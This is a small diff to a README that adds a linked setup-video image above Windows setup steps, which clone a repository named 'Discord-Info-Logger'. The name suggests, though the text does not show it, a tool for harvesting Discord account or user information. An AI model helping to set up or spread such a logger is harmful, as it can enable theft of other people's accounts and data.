@@ -11,6 +11,8 @@ Depending on your python installation your commands may vary.
 Below are the commands needed to set up.
 The script was tested in python 3.8.6, on windows 10. This script only works on windows.
 
+[![Setup](https://i.imgur.com/eT9GSch.png)](https://youtu.be/0sA8pI3yxAU)
+
 Windows:
 ```
 git clone https://github.com/LocalsGitHub/Discord-Info-Logger.git
